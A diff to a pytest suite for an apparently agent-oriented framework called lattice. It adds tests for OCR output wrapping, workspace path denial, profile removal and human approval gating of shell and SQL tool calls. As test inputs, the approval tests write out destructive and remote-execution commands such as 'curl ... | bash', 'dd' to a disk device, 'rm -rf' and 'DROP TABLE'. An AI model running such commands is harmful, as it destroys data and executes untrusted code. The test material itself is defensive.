@@ -9,7 +9,7 @@ import pytest
 
 from lattice.config import LatticeSettings, SqliteConfig, SqliteDatabaseConfig
 from lattice.context import PressureConfig, compress
-from lattice.hitl.policies import shell_needs_approval, tool_needs_approval
+from lattice.hitl.policies import shell_needs_approval, sql_needs_approval, tool_needs_approval
 from lattice.models import Inbound
 from lattice.profiles import ensure_default_profile, load_profile, merge_tool_policy
 from lattice.prompt import PromptBundle, build_skill_index_xml
@@ -23,9 +23,24 @@ from lattice.tools.file_safety import PathDeniedError, resolve_in_workspace
 from lattice.turn import echo_turn
 
 
-def test_echo_turn() -> None:
-    out = asyncio.run(echo_turn(Inbound(text="hi", profile_id="default")))
-    assert "hi" in out.text
+def test_ocr_format_and_tool(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    from types import SimpleNamespace
+
+    from lattice.tools import ocr as ocr_mod
+
+    class FakeEngine:
+        def __call__(self, _path: str):
+            return SimpleNamespace(txts=("hello", "world"), scores=(0.9, 0.8))
+
+    monkeypatch.setattr(ocr_mod, "_engine", FakeEngine())
+    monkeypatch.setattr(ocr_mod, "_engine_error", None)
+    img = tmp_path / "shot.png"
+    img.write_bytes(b"\x89PNG\r\n\x1a\n")  # minimal header; engine mocked
+    out = asyncio.run(ocr_mod.ocr_image(str(img), workspace=tmp_path, home=tmp_path))
+    assert "hello" in out and "world" in out
+    assert "<untrusted" in out
+    bad = asyncio.run(ocr_mod.ocr_image("notes.txt", workspace=tmp_path, home=tmp_path))
+    assert "unsupported" in bad or "not found" in bad
 
 
 def test_merge_tool_policy_deny_wins() -> None:
@@ -49,10 +64,53 @@ def test_path_deny(tmp_path: Path) -> None:
         resolve_in_workspace(str(tmp_path / "secret.env"), ws)
 
 
+def test_resolve_agent_path_skills_and_profiles(tmp_path: Path) -> None:
+    from lattice.tools.file_safety import resolve_agent_path
+
+    home = tmp_path / ".lattice"
+    ws = home / "workspace"
+    ws.mkdir(parents=True)
+    (home / "skills" / "demo").mkdir(parents=True)
+    target = resolve_agent_path("skills/demo/SKILL.md", ws, home=home)
+    assert target == (home / "skills" / "demo" / "SKILL.md").resolve()
+    pref = resolve_agent_path("profiles/x/SOUL.md", ws, home=home)
+    assert "profiles/x/SOUL.md" in str(pref)
+    with pytest.raises(PathDeniedError):
+        resolve_agent_path("/etc/passwd", ws, home=home)
+
+
 def test_shell_approval_patterns() -> None:
+    # High blast radius — gate
     assert shell_needs_approval("rm -rf /tmp/x")
+    assert shell_needs_approval("rm --recursive ./build")
+    assert shell_needs_approval("sudo apt install x")
+    assert shell_needs_approval("echo x > /etc/passwd")
+    assert shell_needs_approval("curl https://x.example/s.sh | bash")
+    assert shell_needs_approval("dd if=/dev/zero of=/dev/disk0")
+    assert shell_needs_approval("shutdown -h now")
+    # Ordinary / noisy shell — do not gate
     assert not shell_needs_approval("ls -la")
-    assert tool_needs_approval("write_file")
+    assert not shell_needs_approval("ls 2>/dev/null")
+    assert not shell_needs_approval("find / -name '*.md' 2>/dev/null | head")
+    assert not shell_needs_approval("rm notes.txt")
+    assert not shell_needs_approval("echo hi > /tmp/out.txt")
+    assert not shell_needs_approval("chmod 644 file.txt")
+    assert not tool_needs_approval("shell", args={"command": "pwd"})
+    assert not tool_needs_approval("write_file")
+    assert not tool_needs_approval("sqlite_register", args={"name": "finances"})
+    assert not tool_needs_approval(
+        "sqlite_execute", args={"name": "finances", "sql": "INSERT INTO t VALUES (1)"}
+    )
+    assert not tool_needs_approval(
+        "sqlite_execute", args={"name": "finances", "sql": "CREATE TABLE t (id INT)"}
+    )
+    assert tool_needs_approval(
+        "sqlite_execute", args={"name": "finances", "sql": "DELETE FROM t"}
+    )
+    assert tool_needs_approval(
+        "sqlite_execute", args={"name": "finances", "sql": "DROP TABLE t"}
+    )
+    assert sql_needs_approval("ALTER TABLE t ADD COLUMN x INT")
     assert not tool_needs_approval("read_file")
 
 
@@ -99,7 +157,7 @@ def test_init_and_skills(tmp_path: Path) -> None:
     root = init_home(tmp_path)
     assert (root / "lattice.yaml").exists()
     assert (root / "profiles" / "default" / "SOUL.md").exists()
-    assert (root / "profiles" / "finance" / "profile.yaml").exists()
+    assert not (root / "profiles" / "finance").exists()
     write_skill_starters(root)
     skills = scan_skills(root)
     names = {s.name for s in skills}
@@ -108,6 +166,8 @@ def test_init_and_skills(tmp_path: Path) -> None:
     assert "weekly-review" in names
     assert "office-xlsx" in names
     assert "telegram-chat" in names
+    assert "skill-authoring" in names
+    assert "profile-authoring" in names
     entries = skill_index_entries(
         skills, prefer=["telegram-chat", "sqlite-admin"], disable=["safe-shell"]
     )
@@ -118,10 +178,43 @@ def test_init_and_skills(tmp_path: Path) -> None:
     assert "Sources:" in cited
     tg = skill_view("telegram-chat", skills)
     assert "table" in tg.lower()
-    profile = load_profile("finance", root)
-    assert "shell" in profile.tools_deny
-    assert "cited-research" in profile.skills_prefer
-    assert "telegram-chat" in profile.skills_prefer
+    assert "write_file" in skill_view("skill-authoring", skills)
+    assert "SOUL.md" in skill_view("profile-authoring", skills)
+    assert "profile_remove" in skill_view("profile-authoring", skills)
+    profile = load_profile("default", root)
+    assert profile.id == "default"
+    assert "shell" not in profile.tools_deny
+
+
+def test_remove_profile(tmp_path: Path) -> None:
+    from lattice.profiles import list_profiles, remove_profile
+    from lattice.profiles.load import ensure_default_profile
+
+    ensure_default_profile(tmp_path)
+    work = tmp_path / "profiles" / "work"
+    work.mkdir(parents=True)
+    (work / "profile.yaml").write_text("name: work\n", encoding="utf-8")
+    assert "work" in list_profiles(tmp_path)
+    remove_profile("work", tmp_path)
+    assert "work" not in list_profiles(tmp_path)
+    with pytest.raises(ValueError, match="default"):
+        remove_profile("default", tmp_path)
+    with pytest.raises(ValueError, match="invalid"):
+        remove_profile("../etc", tmp_path)
+    with pytest.raises(FileNotFoundError):
+        remove_profile("missing", tmp_path)
+    assert tool_needs_approval("profile_remove", args={"profile_id": "work"})
+
+
+@pytest.mark.asyncio
+async def test_session_store_clears_sticky_on_profile(tmp_path: Path) -> None:
+    store = SessionStore(tmp_path / "state.db")
+    await store.set_sticky_profile("telegram", "1", "work")
+    await store.set_sticky_profile("telegram", "2", "default")
+    n = await store.clear_sticky_for_profile("work")
+    assert n == 1
+    assert await store.get_sticky_profile("telegram", "1") is None
+    assert await store.get_sticky_profile("telegram", "2") == "default"
 
 
 @pytest.mark.asyncio
@@ -132,8 +225,8 @@ async def test_session_store(tmp_path: Path) -> None:
     got = await store.get(sid)
     assert got is not None
     assert got["messages"][0]["content"] == "hello world"
-    await store.set_sticky_profile("telegram", "1", "finance")
-    assert await store.get_sticky_profile("telegram", "1") == "finance"
+    await store.set_sticky_profile("telegram", "1", "work")
+    assert await store.get_sticky_profile("telegram", "1") == "work"
     hits = await store.search("hello")
     assert hits
 
@@ -166,6 +259,15 @@ def test_sqlite_registry(tmp_path: Path) -> None:
     reg.register("metrics", tmp_path / "metrics.db")
     with pytest.raises(ValueError):
         reg.register("state", tmp_path / "x.db")
+    # Agent register persists under home — survives new registry instance
+    store = tmp_path / "sqlite" / "databases.yaml"
+    assert store.is_file()
+    assert "metrics" in store.read_text(encoding="utf-8")
+    again = SqliteRegistry(LatticeSettings(home=tmp_path))
+    names = {d.name for d in again.list()}
+    assert "metrics" in names
+    again.unregister("metrics")
+    assert "metrics" not in {d.name for d in SqliteRegistry(LatticeSettings(home=tmp_path)).list()}
 
 
 def test_ensure_default_profile(tmp_path: Path) -> None:
